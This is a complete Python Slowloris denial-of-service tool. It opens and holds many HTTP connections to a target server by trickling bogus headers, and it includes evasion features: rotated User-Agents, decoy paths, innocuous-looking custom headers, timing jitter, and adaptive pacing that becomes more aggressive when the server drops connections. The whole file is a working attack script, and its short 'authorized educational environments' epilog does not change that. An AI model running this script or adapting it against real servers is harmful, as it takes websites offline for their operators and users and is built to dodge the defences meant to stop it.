import socket
import threading
import time
import random
import sys
import argparse
import base64
import hashlib
import struct

# --- Core Components & Globals ---

# A global threading.Event to signal all worker threads to stop gracefully.
stop_event = threading.Event()

# A list of realistic User-Agent strings to avoid basic filtering.
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
]

# A list of legitimate-looking paths to request.
LEGIT_PATHS = ["/", "/index.html", "/login", "/search", "/products", "/news"]


class AttackState:
    """
    A thread-safe class to hold and update the attack's dynamic settings.
    This allows the main manager thread to communicate changes to all worker threads.
    """
    def __init__(self, sleep_interval):
        self.sleep_interval = sleep_interval
        self.lock = threading.Lock()

    def get_sleep(self):
        """Safely gets the current sleep interval with a small amount of jitter."""
        with self.lock:
            # Add jitter to make the timing less predictable
            return self.sleep_interval + random.uniform(-1, 1)

    def set_sleep(self, new_interval):
        """Safely updates the sleep interval if it has changed."""
        with self.lock:
            new_interval = max(2, new_interval) # Ensure sleep doesn't go below a safe threshold
            if self.sleep_interval != new_interval:
                print(f"[!] Pace changed: Keep-alive interval now ~{new_interval:.1f}s")
                self.sleep_interval = new_interval


class SocketWorker(threading.Thread):
    """
    A worker thread to manage the lifecycle of a single socket.
    It incorporates evasion techniques.
    """
    def __init__(self, target_ip, target_port, header_size, attack_state, worker_id):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.header_size = header_size
        self.attack_state = attack_state
        self.worker_id = worker_id
        self.sock = None

    def create_realistic_request(self):
        """Creates a realistic-looking initial HTTP request."""
        path = random.choice(LEGIT_PATHS)
        user_agent = random.choice(USER_AGENTS)
        
        request_line = f"GET {path}?{random.randint(0, 9999)} HTTP/1.1\r\n"
        host_header = f"Host: {self.target_ip}\r\n"
        ua_header = f"User-Agent: {user_agent}\r\n"
        
        # Add some other common headers to appear more legitimate
        common_headers = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Connection: keep-alive\r\n",
            "Upgrade-Insecure-Requests: 1\r\n"
        ]
        
        return request_line.encode("utf-8") + host_header.encode("utf-8") + \
               ua_header.encode("utf-8") + random.choice(common_headers).encode("utf-8")

    def generate_keep_alive_header(self):
        """Generates a plausible-looking header to keep the connection open."""
        # This uses the concept of "steganographic" headers from the cloud script.
        # Instead of a simple "X-a: b", it sends headers that might be ignored but
        # are not immediately suspicious.
        headers = [
            f"X-Request-ID: {''.join(random.choices('0123456789abcdef', k=self.header_size))}\r\n",
            f"X-Client-Trace-Id: {base64.b64encode(str(random.random()).encode()).decode()[:self.header_size]}\r\n",
            f"X-Custom-Header: {random.choice('abcdefghijklmnopqrstuvwxyz') * self.header_size}\r\n"
        ]
        return random.choice(headers).encode("utf-8")

    def run(self):
        """The main logic for the worker thread."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((self.target_ip, self.target_port))

            # Send the initial, realistic-looking HTTP headers
            self.sock.send(self.create_realistic_request())

            # This is the main keep-alive loop
            while not stop_event.is_set():
                # Send a bogus header to keep the socket alive
                self.sock.send(self.generate_keep_alive_header())
                
                # Get the current sleep interval from the shared state
                current_sleep = self.attack_state.get_sleep()
                time.sleep(max(1, current_sleep))

        except socket.error:
            # Any socket error (timeout, reset) will cause the thread to exit.
            # The manager loop will detect the dead thread and create a new one.
            pass
        finally:
            if self.sock:
                self.sock.close()


def main():
    """Parses arguments and manages the attack."""
    parser = argparse.ArgumentParser(
        description="Unified Slowloris script with evasion and aggressive connection management.",
        epilog="Use this tool responsibly and only in authorized educational environments."
    )
    parser.add_argument("hostname", help="The target server's hostname or IP address.")
    parser.add_argument("connections", type=int, help="The number of connections to maintain.")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80).")
    parser.add_argument("--header-size", type=int, default=128, help="Size of the keep-alive header value (default: 128).")
    parser.add_argument("--sleep", type=int, default=15, help="Initial maximum time in seconds between sending keep-alive headers (default: 15).")
    
    args = parser.parse_args()
    
    # Create the shared state object to be passed to all workers
    attack_state = AttackState(args.sleep)

    print(f"[*] Starting unified attack on {args.hostname}:{args.port} with {args.connections} connections.")
    
    threads = []
    worker_counter = 0
    try:
        # This is the main manager loop, inspired by 'advanced_slowloris.py' for its effectiveness.
        while not stop_event.is_set():
            # Prune dead threads to get an accurate count of active connections
            num_before_prune = len(threads)
            threads = [t for t in threads if t.is_alive()]
            num_after_prune = len(threads)
            dropped_count = num_before_prune - num_after_prune
            
            # --- AGGRESSIVE DYNAMIC PACING LOGIC ---
            # This is the core logic from the simple, working script.
            # If the server is dropping our connections, we get more aggressive.
            if dropped_count > (args.connections * 0.05) and dropped_count > 5:
                # Decrease sleep interval to send keep-alives more frequently
                new_sleep = attack_state.sleep_interval - 2
                attack_state.set_sleep(max(3, new_sleep)) # Don't let sleep time get too low
            # If connections are stable, we can be stealthier by slowly increasing the interval.
            elif dropped_count == 0 and len(threads) == args.connections and attack_state.sleep_interval < args.sleep:
                attack_state.set_sleep(attack_state.sleep_interval + 1)
            # ----------------------------------------

            # --- AGGRESSIVE REPLENISHMENT ---
            # Immediately create new workers to replace any that have died.
            while len(threads) < args.connections:
                worker = SocketWorker(args.hostname, args.port, args.header_size, attack_state, worker_counter)
                worker.start()
                threads.append(worker)
                worker_counter += 1

            # Print a status update
            print(f"[*] Active Connections: {len(threads)}/{args.connections} | Dropped: {dropped_count} | Pace: ~{attack_state.sleep_interval:.1f}s")
            time.sleep(1) # The manager loop sleeps for 1 second between checks

    except KeyboardInterrupt:
        # Graceful shutdown process
        print("\n[!] Attack stopped by user. Shutting down all threads...")
        stop_event.set()
        for t in threads:
            t.join()
        print("[*] All threads terminated.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
